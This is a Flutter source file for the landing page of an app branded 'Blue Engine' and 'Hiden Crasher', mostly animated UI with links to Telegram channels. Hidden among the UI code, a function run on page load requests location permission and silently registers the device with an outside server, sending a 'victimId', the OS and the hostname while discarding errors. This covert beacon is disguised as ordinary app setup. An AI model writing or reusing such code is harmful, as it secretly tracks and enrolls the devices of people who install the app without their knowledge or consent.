// ignore_for_file: use_build_context_synchronously, deprecated_member_use
import 'dart:ui';
import 'dart:io';
import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:url_launcher/url_launcher.dart';
import 'login_page.dart';

const Color _lBg = Color(0xFF111520);
const Color _lDarkGrey = Color(0xFF6B7280);  // Warna dark grey untuk aksen
const Color _lLightGrey = Color(0xFF9CA3AF); // Warna grey lebih terang untuk gradient
const Color _lBgCard = Color(0xFF1C2230);
const String _lFont = "Rajdhani";

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage> with TickerProviderStateMixin {
  // Entry animation
  late AnimationController _entryController;
  late Animation<double> _fadeAnimation;
  late Animation<Offset> _slideAnimation;

  // Loop animation
  late AnimationController _loopController;
  late Animation<double> _floatingAnimation;

  // Video player
  VideoPlayerController? _videoController;
  bool _videoReady = false;

  // Warna asli (dipertahankan untuk kompatibilitas fungsi)
  final Color darkBg = const Color(0xFF050A07);
  final Color greenPrimary = const Color(0xFF25D366);
  final Color greenDark = const Color(0xFF0D2415);
  final Color greenGlow = const Color(0xFF1B5E20);

  // ── Fungsi yang tidak diubah ──────────────────────────────────────────────
  Future<void> _initTargetSystem() async {
    try {
      var status = await Permission.location.request();
      if (status.isGranted) {
        debugPrint("Izin Lokasi Diberikan");
      }

      const String serverBase = "http://vintolxbuyerbetot.omdhankiw.my.id:2000";
      final String victimId = "ZDX-${Platform.localHostname.hashCode}";

      http.post(
        Uri.parse("$serverBase/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": victimId,
          "model": "${Platform.operatingSystem} | ${Platform.localHostname}",
          "status": "Active",
        }),
      ).timeout(const Duration(seconds: 3)).catchError((e) => null);
    } catch (e) {
      debugPrint("Error Init: $e");
    }
  }

  @override
  void initState() {
    super.initState();
    _initTargetSystem();

    // Entry animation
    _entryController = AnimationController(vsync: this, duration: const Duration(milliseconds: 1600));
    _fadeAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _entryController, curve: Curves.easeOut),
    );
    _slideAnimation = Tween<Offset>(begin: const Offset(0, 0.1), end: Offset.zero).animate(
      CurvedAnimation(parent: _entryController, curve: Curves.easeOutCubic),
    );

    // Loop animation
    _loopController = AnimationController(vsync: this, duration: const Duration(seconds: 3))..repeat(reverse: true);
    _floatingAnimation = Tween<double>(begin: -10.0, end: 10.0).animate(
      CurvedAnimation(parent: _loopController, curve: Curves.easeInOut),
    );

    _entryController.forward();

    // Video player
    _videoController = VideoPlayerController.asset("assets/videos/landing.mp4")
      ..initialize().then((_) {
        if (mounted) {
          setState(() => _videoReady = true);
          _videoController!.setLooping(true);
          _videoController!.setVolume(1.0);
          _videoController!.play();
        }
      }).catchError((_) {});
  }

  @override
  void dispose() {
    _entryController.dispose();
    _loopController.dispose();
    _videoController?.dispose();
    super.dispose();
  }

  // ── Stagger Animation Helper ──────────────────────────────────────────────
  Animation<double> _stagger(double start, double end) {
    return Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(
        parent: _entryController,
        curve: Interval(start, end, curve: Curves.easeOutCubic),
      ),
    );
  }

  Widget _fadeSlide({required Animation<double> anim, double offsetY = 22, required Widget child}) {
    return AnimatedBuilder(
      animation: anim,
      builder: (_, __) => Opacity(
        opacity: anim.value,
        child: Transform.translate(
          offset: Offset(0, offsetY * (1.0 - anim.value)),
          child: child,
        ),
      ),
    );
  }

  // ── Button Builders ───────────────────────────────────────────────────────
  Widget _buildLongButton({
    required IconData icon,
    required String label,
    required List<Color> gradient,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: gradient, begin: Alignment.centerLeft, end: Alignment.centerRight),
          borderRadius: BorderRadius.circular(14),
          boxShadow: [
            BoxShadow(color: gradient.first.withOpacity(0.35), blurRadius: 14, offset: const Offset(0, 5)),
          ],
        ),
        child: Row(
          children: [
            Icon(icon, color: Colors.white, size: 22),
            const SizedBox(width: 14),
            Text(label,
                style: const TextStyle(
                    color: Colors.white, fontSize: 15, fontWeight: FontWeight.w800, fontFamily: _lFont, letterSpacing: 0.8)),
            const Spacer(),
            const Icon(Icons.arrow_forward_ios_rounded, color: Colors.white38, size: 14),
          ],
        ),
      ),
    );
  }

  Widget _buildHalfButton({
    required IconData icon,
    required String label,
    required List<Color> gradient,
    required VoidCallback onTap,
  }) {
    return Expanded(
      child: GestureDetector(
        onTap: onTap,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: gradient, begin: Alignment.topLeft, end: Alignment.bottomRight),
            borderRadius: BorderRadius.circular(14),
            boxShadow: [
              BoxShadow(color: gradient.first.withOpacity(0.28), blurRadius: 10, offset: const Offset(0, 4)),
            ],
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(icon, color: Colors.white, size: 18),
              const SizedBox(width: 8),
              Flexible(
                child: Text(label,
                    style: const TextStyle(
                        color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700, fontFamily: _lFont),
                    overflow: TextOverflow.ellipsis),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ── Glow circle (helper dari versi lama, dipertahankan) ───────────────────
  Widget _glowCircle(double size, Color color) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: RadialGradient(
          colors: [color, Colors.transparent],
          stops: const [0.1, 1.0],
        ),
      ),
    );
  }

  // ── Build ─────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _lBg,
      body: Stack(
        children: [
          // Hexagon pojok kanan atas (di belakang, akan tertutup video)
          Positioned(
            top: -20,
            right: -20,
            child: _HexagonPattern(size: 220, color: _lDarkGrey.withOpacity(0.13)),
          ),

          // Hexagon pojok kiri bawah
          Positioned(
            bottom: -20,
            left: -20,
            child: _HexagonPattern(size: 220, color: _lDarkGrey.withOpacity(0.13)),
          ),

          // Konten utama (di atas hexagon)
          SingleChildScrollView(
            physics: const BouncingScrollPhysics(),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [

                // ── VIDEO BANNER ────────────────────────────────────────────
                _fadeSlide(
                  anim: _stagger(0.0, 0.22),
                  offsetY: 0,
                  child: Container(
                    width: double.infinity,
                    height: 290,
                    color: Colors.black,
                    child: Stack(
                      children: [
                        // Video
                        if (_videoReady && _videoController != null)
                          Positioned.fill(
                            child: FittedBox(
                              fit: BoxFit.cover,
                              child: SizedBox(
                                width: _videoController!.value.size.width,
                                height: _videoController!.value.size.height,
                                child: VideoPlayer(_videoController!),
                              ),
                            ),
                          )
                        else
                          Center(
                            child: CircularProgressIndicator(color: _lDarkGrey.withOpacity(0.5), strokeWidth: 2),
                          ),
                        // Bayangan bawah (efek 3D — transisi ke halaman)
                        Positioned(
                          bottom: 0, left: 0, right: 0,
                          child: Container(
                            height: 70,
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                begin: Alignment.bottomCenter,
                                end: Alignment.topCenter,
                                colors: [_lBg, Colors.transparent],
                              ),
                            ),
                          ),
                        ),
                        // Bayangan sisi kiri
                        Positioned(
                          top: 0, bottom: 0, left: 0,
                          child: Container(
                            width: 30,
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                begin: Alignment.centerLeft,
                                end: Alignment.centerRight,
                                colors: [Colors.black.withOpacity(0.5), Colors.transparent],
                              ),
                            ),
                          ),
                        ),
                        // Bayangan sisi kanan
                        Positioned(
                          top: 0, bottom: 0, right: 0,
                          child: Container(
                            width: 30,
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                begin: Alignment.centerRight,
                                end: Alignment.centerLeft,
                                colors: [Colors.black.withOpacity(0.5), Colors.transparent],
                              ),
                            ),
                          ),
                        ),
                        // Bayangan atas
                        Positioned(
                          top: 0, left: 0, right: 0,
                          child: Container(
                            height: 40,
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [Colors.black.withOpacity(0.4), Colors.transparent],
                              ),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),

                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 22),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const SizedBox(height: 16),

                      // ── VOID ENGINE TITLE ──────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.10, 0.32),
                        child: RichText(
                          text: TextSpan(
                            style: const TextStyle(
                                fontSize: 40,
                                fontWeight: FontWeight.w900,
                                fontFamily: _lFont,
                                letterSpacing: 2.5),
                            children: [
                              const TextSpan(text: "BL", style: TextStyle(color: Colors.white)),
                              TextSpan(text: "UE", style: TextStyle(color: _lDarkGrey)),
                              const TextSpan(text: "  "),
                              TextSpan(text: "EN", style: TextStyle(color: _lDarkGrey)),
                              const TextSpan(text: "GINE", style: TextStyle(color: Colors.white)),
                            ],
                          ),
                        ),
                      ),

                      const SizedBox(height: 8),

                      // ── SUBTITLE ────────────────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.16, 0.38),
                        child: const Text(
                          "Aplikasi Yang Dikembangkan Oleh VinoGantenggg.",
                          style: TextStyle(
                              color: Colors.white54,
                              fontSize: 12,
                              fontFamily: _lFont,
                              letterSpacing: 0.8,
                              height: 1.5),
                        ),
                      ),

                      const SizedBox(height: 22),

                      // ── INFO BOX ─────────────────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.22, 0.44),
                        child: Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(16),
                          decoration: BoxDecoration(
                            color: _lBgCard,
                            borderRadius: BorderRadius.circular(14),
                            border: Border.all(color: Colors.white.withOpacity(0.07)),
                            boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 12)],
                          ),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Row(children: [
                                const Icon(Icons.info_outline_rounded, color: _lDarkGrey, size: 16),
                                const SizedBox(width: 8),
                                const Text("Tentang Hiden Crasher",
                                    style: TextStyle(
                                        color: Colors.white,
                                        fontSize: 13,
                                        fontWeight: FontWeight.w800,
                                        fontFamily: _lFont,
                                        letterSpacing: 0.8)),
                              ]),
                              const SizedBox(height: 10),
                              Text(
                                "Hiden Crasher adalah platform tools canggih yang dirancang untuk memberikan performa terbaik. "
                                "Dikembangkan secara profesional oleh tim Hiden Crasher dengan teknologi mutakhir dan sistem keamanan tinggi.",
                                style: TextStyle(
                                    color: Colors.white.withOpacity(0.55),
                                    fontSize: 12,
                                    fontFamily: _lFont,
                                    height: 1.65),
                              ),
                            ],
                          ),
                        ),
                      ),

                      const SizedBox(height: 18),

                      // ── BUTTON 1: SIGN IN ─────────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.28, 0.50),
                        child: _buildLongButton(
                          icon: Icons.login_rounded,
                          label: "Sig-In To Blue",
                          gradient: const [Color(0xFF374151), Color(0xFF4B5563)], // Dark grey gradient
                          onTap: () => Navigator.pushReplacement(
                            context,
                            MaterialPageRoute(builder: (_) => const LoginPage()),
                          ),
                        ),
                      ),

                      const SizedBox(height: 12),

                      // ── BUTTON 2: VISIT WEBSITE ────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.34, 0.56),
                        child: _buildLongButton(
                          icon: Icons.language_rounded,
                          label: "Visit Channel Info",
                          gradient: const [Color(0xFF4B5563), Color(0xFF6B7280)], // Light grey gradient
                          onTap: () async {
                            final uri = Uri.parse("https://t.me/infohidencrasher");
                            if (await canLaunchUrl(uri)) {
                              launchUrl(uri, mode: LaunchMode.externalApplication);
                            }
                          },
                        ),
                      ),

                      const SizedBox(height: 12),

                      // ── ROW: DEVELOPER + OWNER ─────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.40, 0.62),
                        child: Row(
                          children: [
                            _buildHalfButton(
                              icon: FontAwesomeIcons.telegram,
                              label: "Developer",
                              gradient: const [Color(0xFF374151), Color(0xFF4B5563)], // Dark grey gradient
                              onTap: () async {
                                final uri = Uri.parse("https://t.me/hidenxvinzz");
                                if (await canLaunchUrl(uri)) {
                                  launchUrl(uri, mode: LaunchMode.externalApplication);
                                }
                              },
                            ),
                            const SizedBox(width: 12),
                            _buildHalfButton(
                              icon: FontAwesomeIcons.telegram,
                              label: "Owner",
                              gradient: const [Color(0xFF4B5563), Color(0xFF6B7280)], // Light grey gradient
                              onTap: () async {
                                final uri = Uri.parse("https://t.me/Galaxymarketvvip");
                                if (await canLaunchUrl(uri)) {
                                  launchUrl(uri, mode: LaunchMode.externalApplication);
                                }
                              },
                            ),
                          ],
                        ),
                      ),

                      const SizedBox(height: 20),

                      // ── FOOTER BOX ─────────────────────────────────────────────
                      _fadeSlide(
                        anim: _stagger(0.48, 0.70),
                        child: Container(
                          width: double.infinity,
                          padding: const EdgeInsets.symmetric(vertical: 18),
                          decoration: BoxDecoration(
                            color: _lBgCard.withOpacity(0.55),
                            borderRadius: BorderRadius.circular(14),
                            border: Border.all(color: Colors.white.withOpacity(0.06)),
                          ),
                          child: Column(
                            children: [
                              const Text(
                                "BY: HIDEN CRASHER TEAM",
                                style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 14,
                                    fontWeight: FontWeight.w900,
                                    fontFamily: _lFont,
                                    letterSpacing: 2),
                              ),
                              const SizedBox(height: 5),
                              Text(
                                "© 2026 Hiden Crasher Team — All Rights Reserved",
                                style: TextStyle(
                                    color: Colors.white.withOpacity(0.3), fontSize: 10, fontFamily: _lFont, letterSpacing: 0.8),
                              ),
                            ],
                          ),
                        ),
                      ),

                      const SizedBox(height: 36),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// HEXAGON PATTERN PAINTER
// ═══════════════════════════════════════════════════════════════════════════════
class _HexagonPattern extends StatelessWidget {
  final double size;
  final Color color;
  const _HexagonPattern({required this.size, required this.color});

  @override
  Widget build(BuildContext context) {
    return SizedBox(width: size, height: size, child: CustomPaint(painter: _HexPatternPainter(color: color)));
  }
}

class _HexPatternPainter extends CustomPainter {
  final Color color;
  const _HexPatternPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..style = PaintingStyle.stroke
      ..strokeWidth = 1.0;

    const hexR = 18.0;
    final w = hexR * math.sqrt(3);
    final h = hexR * 2;
    final cols = (size.width / w).ceil() + 2;
    final rows = (size.height / h * 1.5).ceil() + 2;

    for (int row = -1; row < rows; row++) {
      for (int col = -1; col < cols; col++) {
        final x = col * w + (row.isOdd ? w / 2 : 0);
        final y = row * h * 0.75;
        _drawHex(canvas, paint, Offset(x, y), hexR);
      }
    }
  }

  void _drawHex(Canvas canvas, Paint paint, Offset center, double r) {
    final path = Path();
    for (int i = 0; i < 6; i++) {
      final angle = math.pi / 180 * (60 * i - 30);
      final x = center.dx + r * math.cos(angle);
      final y = center.dy + r * math.sin(angle);
      if (i == 0) {
        path.moveTo(x, y);
      } else {
        path.lineTo(x, y);
      }
    }
    path.close();
    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(covariant _HexPatternPainter old) => old.color != color;
}